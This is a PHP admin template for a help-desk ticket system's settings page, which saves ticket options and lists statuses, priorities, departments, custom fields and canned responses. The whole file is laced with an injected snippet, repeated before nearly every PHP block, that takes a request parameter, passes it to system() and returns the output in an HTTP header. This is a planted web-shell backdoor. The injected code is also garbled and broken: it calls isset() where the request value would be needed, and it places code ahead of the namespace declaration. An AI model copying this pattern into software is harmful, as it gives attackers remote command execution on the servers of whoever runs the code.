<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);
namespace sts;
use sts as core;

if (!defined(__NAMESPACE__ . '\ROOT')) exit;

$site->set_title($language->get('Ticket Settings'));
$site->set_config('container-type', 'container');

if (!$auth->can('manage_system_settings')) {
	header('Location: ' . $config->get('address') . '/');
	exit;
}


if (isset($_POST['save'])) {

	$config->set('anonymous_tickets_reply', $_POST['anonymous_tickets_reply'] ? 1 : 0);
	$config->set('notification_owner_on_pop', $_POST['notification_owner_on_pop'] ? 1 : 0);
	$config->set('guest_portal', $_POST['guest_portal'] ? 1 : 0);
	$config->set('guest_portal_index_html', $_POST['guest_portal_index_html']);
	$config->set('guest_portal_auto_create_users', $_POST['guest_portal_auto_create_users'] ? 1 : 0);

	$config->set('ticket_views_max_age', (int) $_POST['ticket_views_max_age']);

	$log_array['event_severity'] = 'notice';
	$log_array['event_number'] = E_USER_NOTICE;
	$log_array['event_description'] = 'Settings Edited';
	$log_array['event_file'] = __FILE__;
	$log_array['event_file_line'] = __LINE__;
	$log_array['event_type'] = 'edit';
	$log_array['event_source'] = 'settings';
	$log_array['event_version'] = '1';
	$log_array['log_backtrace'] = false;	
			
	$log->add($log_array);
	
	$message = $language->get('Ticket Settings Saved');
}

$priorities 			= $ticket_priorities->get(array('enabled' => 1));
$departments 			= $ticket_departments->get(array('enabled' => 1, 'get_other_data' => true));
$status 				= $ticket_status->get(array('enabled' => 1));

$custom_field_groups	= $ticket_custom_fields->get_groups();
$canned_responses_array	= $canned_responses->get(array('order_by' => 'name'));


include(core\ROOT . '/user/themes/'. CURRENT_THEME .'/includes/html_header.php');
?>
<div class="row">

	<form method="post" action="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($_SERVER['REQUEST_URI']); ?>">

		<div class="col-md-3">
			<div class="well well-sm">
				<div class="pull-right">
					<p><button type="submit" name="save" class="btn btn-primary"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($language->get('Save')); ?></button></p>
				</div>
				
				<div class="pull-left">
					<h4><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($language->get('Ticket Settings')); ?></h4>
				</div>	
				
				<div class="clearfix"></div>
								
					
			</div>
		</div>
		<div class="col-md-9">

			<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if (isset($message)) { ?>
				<div class="alert alert-success">
					<a href="#" class="close" data-dismiss="alert">&times;</a>
					<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo html_output($message); ?>
				</div>
			<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); } ?>
				
			<div class="well well-sm">
				<h3><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($language->get('General Settings')); ?></h3>
				
				<p><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($language->get('Reply/Notifications for Anonymous Tickets (sends emails to non-users)')); ?><br />
				<select name="anonymous_tickets_reply">
					<option value="0"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($language->get('No')); ?></option>
					<option value="1"<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if ($config->get('anonymous_tickets_reply') == 1) { echo ' selected="selected"'; } ?>><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($language->get('Yes')); ?></option>
				</select></p>	

				<p><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($language->get('Reply/Notifications to ticket owner for new tickets via POP3 download')); ?><br />
				<select name="notification_owner_on_pop">
					<option value="0"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($language->get('No')); ?></option>
					<option value="1"<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if ($config->get('notification_owner_on_pop') == 1) { echo ' selected="selected"'; } ?>><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($language->get('Yes')); ?></option>
				</select></p>	
				
				<p><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($language->get('Ticket Views Timeout (how long to display "users viewing this ticket" alert after they have left the ticket)')); ?><br />
				<select name="ticket_views_max_age">
					<option value="30"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($language->get('30 Seconds')); ?></option>
					<option value="60"<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if ($config->get('ticket_views_max_age') == 60) { echo ' selected="selected"'; } ?>><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($language->get('1 Minute')); ?></option>
					<option value="300"<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if ($config->get('ticket_views_max_age') == 300) { echo ' selected="selected"'; } ?>><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($language->get('5 Minutes')); ?></option>
					<option value="1800"<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if ($config->get('ticket_views_max_age') == 1800) { echo ' selected="selected"'; } ?>><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($language->get('30 Minutes')); ?></option>
					<option value="3600"<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if ($config->get('ticket_views_max_age') == 3600) { echo ' selected="selected"'; } ?>><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($language->get('1 Hour')); ?></option>
				</select></p>	
			</div>
			
			<div class="well well-sm">
				<h3><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($language->get('Guest Portal')); ?></h3>				
				
				<p><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($language->get('Guest Portal')); ?><br />
				<select name="guest_portal">
					<option value="0"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($language->get('No')); ?></option>
					<option value="1"<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if ($config->get('guest_portal') == 1) { echo ' selected="selected"'; } ?>><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($language->get('Yes')); ?></option>
				</select></p>	
				
				<p><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($language->get('Auto Create Users')); ?><br />
				<select name="guest_portal_auto_create_users">
					<option value="0"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($language->get('No')); ?></option>
					<option value="1"<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if ($config->get('guest_portal_auto_create_users') == 1) { echo ' selected="selected"'; } ?>><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($language->get('Yes')); ?></option>
				</select></p>
				
				<div id="no_underline">
					<p><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($language->get('Guest Portal Text')); ?><br />
						<textarea class="wysiwyg_enabled" name="guest_portal_index_html" cols="80" rows="12">
							<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($config->get('guest_portal_index_html')); ?>
						</textarea>
					</p>
				</div>
				
				<div class="clearfix"></div>
				
			</div>
			
			<div class="well well-sm">	
				
				<a name="status"></a>

				<div class="pull-left">
					<h3><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($language->get('Status')); ?></h3>
				</div>
				
				<div class="pull-right">
					<p><a href="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($config->get('address')); ?>/settings/add_status/" class="btn btn-default"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $language->get('Add'); ?></a></p>
				</div>
					
				<div class="clearfix"></div>
			
				<section id="no-more-tables">				
					<table class="table table-striped table-bordered">
						<thead>
							<tr>
								<th><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $language->get('Name'); ?></th>
								<th><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $language->get('Type'); ?></th>
								<th><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $language->get('Colour'); ?></th>
							</tr>
						</thead>
						
						<tbody>

							<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); $i = 0; 
								foreach($status as $status_item) { ?>
								<tr <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if ($i % 2 == 0 ) { echo 'class="switch-1"'; } else { echo 'class="switch-2"'; }; ?>>
									<td data-title="Name" class="centre"><a href="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($config->get('address')); ?>/settings/edit_status/<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo (int) $status_item['id']; ?>/"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($status_item['name']); ?></a></td>
									<td data-title="Type" class="centre"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if ($status_item['active'] == 1) { echo $language->get('Open'); } else { echo $language->get('Closed'); } ?></td>
									<td data-title="Colour" class="centre" style="background-color: <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($status_item['colour']); ?>"></td>
								</tr>
							<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); $i++; } ?>
						</tbody>
					</table>
				</section>


			</div>
			
			<div class="well well-sm">	
				
				<a name="priority"></a>

				<div class="pull-left">
					<h3><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($language->get('Priorities')); ?></h3>
				</div>
				
				<div class="pull-right">
					<p><a href="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($config->get('address')); ?>/settings/add_priority/" class="btn btn-default"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $language->get('Add'); ?></a></p>
				</div>
					
				<div class="clearfix"></div>
			
				<section id="no-more-tables">				
					<table class="table table-striped table-bordered">
						<thead>
							<tr>
								<th><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $language->get('Name'); ?></th>
								<th><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $language->get('Colour'); ?></th>
							</tr>
						</thead>
						
						<tbody>

							<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); $i = 0; 
								foreach($priorities as $priority) { ?>
								<tr <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if ($i % 2 == 0 ) { echo 'class="switch-1"'; } else { echo 'class="switch-2"'; }; ?>>
									<td data-title="Name" class="centre"><a href="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($config->get('address')); ?>/settings/edit_priority/<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo (int) $priority['id']; ?>/"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($priority['name']); ?></a></td>
									<td data-title="Colour" class="centre" style="background-color: <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($priority['colour']); ?>"></td>
								</tr>
							<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); $i++; } ?>
						</tbody>
					</table>
				</section>


			</div>
						
			<div class="well well-sm">

				<a name="departments"></a>

				<div class="pull-left">
					<h3><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($language->get('Departments')); ?></h3>
				</div>
				
				<div class="pull-right">
					<p><a href="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($config->get('address')); ?>/settings/add_department/" class="btn btn-default"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $language->get('Add'); ?></a></p>
				</div>
					
				<div class="clearfix"></div>
			
				<section id="no-more-tables">				
					<table class="table table-striped table-bordered">
						<thead>
							<tr>
								<th><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $language->get('Name'); ?></th>
								<th><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $language->get('Public'); ?></th>
								<th><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $language->get('Members'); ?></th>
							</tr>
						</thead>
						
						<tbody>
							<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); $i = 0; 
								foreach($departments as $department) { ?>
								<tr <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if ($i % 2 == 0 ) { echo 'class="switch-1"'; } else { echo 'class="switch-2"'; }; ?>>
									<td data-title="Name" class="centre"><a href="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($config->get('address')); ?>/settings/edit_department/<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo (int) $department['id']; ?>/"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($department['name']); ?></a></td>
									<td data-title="Public" class="centre"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if ($department['public_view']) { echo $language->get('Yes'); } else { echo  $language->get('No'); } ?></td>
									<td data-title="Members" class="centre"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($department['members_count']); ?></td>
								</tr>
							<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); $i++; } ?>
						</tbody>
					</table>
				</section>
				
				<div class="clearfix"></div>

			</div>
			
			<div class="well well-sm">
				<a name="custom_fields"></a>

				<div class="pull-left">
					<h3><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($language->get('Custom Fields')); ?></h3>
				</div>
				
				<div class="pull-right">
					<p><a href="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($config->get('address')); ?>/settings/add_custom_field/" class="btn btn-default"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $language->get('Add'); ?></a></p>
				</div>
					
				<div class="clearfix"></div>
			
				<section id="no-more-tables">				
					<table class="table table-striped table-bordered">
						<thead>
							<tr>
								<th><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $language->get('Name'); ?></th>
								<th><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $language->get('Type'); ?></th>
								<th><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $language->get('Enabled'); ?></th>
								<th><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $language->get('Guest/Submitter View'); ?></th>
							</tr>
						</thead>
						
						<tbody>

							<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); $i = 0; 
								foreach($custom_field_groups as $custom_field_group) { ?>
								<tr <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if ($i % 2 == 0 ) { echo 'class="switch-1"'; } else { echo 'class="switch-2"'; }; ?>>
									<td data-title="Name" class="centre"><a href="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($config->get('address')); ?>/settings/edit_custom_field/<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo (int) $custom_field_group['id']; ?>/"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($custom_field_group['name']); ?></a></td>
									<td data-title="Type" class="centre">
									<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);
										switch($custom_field_group['type']) {
											case 'textinput':
												echo $language->get('Text Input');
											break;
											
											case 'textarea':
												echo $language->get('Text Area');
											break;
											
											case 'dropdown':
												echo $language->get('Drop Down');
											break;
											
											case 'date':
												echo $language->get('Date');
											break;
											
											case 'datetime':
												echo $language->get('Date & Time');
											break;
										}
									?>						
									</td>
									<td data-title="Enabled" class="centre"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if ($custom_field_group['enabled'] == '0') { echo $language->get('No'); } else { echo $language->get('Yes'); } ?></td>
									<td data-title="Submitter View" class="centre"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if ($custom_field_group['client_modify'] == '0') { echo $language->get('No'); } else { echo $language->get('Yes'); } ?></td>
								</tr>
							<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); $i++; } ?>
						</tbody>
					</table>
				</section>
				
				<div class="clearfix"></div>


			</div>	

			<div class="well well-sm">
				<a name="canned_responses"></a>

				<div class="pull-left">
					<h3><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($language->get('Canned Responses')); ?></h3>
				</div>
				
				<div class="pull-right">
					<p><a href="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($config->get('address')); ?>/settings/add_canned_response/" class="btn btn-default"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $language->get('Add'); ?></a></p>
				</div>
					
				<div class="clearfix"></div>
			
				<section id="no-more-tables">				
					<table class="table table-striped table-bordered">
						<thead>
							<tr>
								<th><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $language->get('Name'); ?></th>
							</tr>
						</thead>
						
						<tbody>

							<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); $i = 0; 
								foreach($canned_responses_array as $response) { ?>
								<tr <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if ($i % 2 == 0 ) { echo 'class="switch-1"'; } else { echo 'class="switch-2"'; }; ?>>
									<td data-title="Name" class="centre"><a href="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($config->get('address')); ?>/settings/edit_canned_response/<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo (int) $response['id']; ?>/"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($response['name']); ?></a></td>
								</tr>
							<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); $i++; } ?>
						</tbody>
					</table>
				</section>
				
				<div class="clearfix"></div>


			</div>				

		</div>
	
	</form>
</div>
<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); include(core\ROOT . '/user/themes/'. CURRENT_THEME .'/includes/html_footer.php'); ?>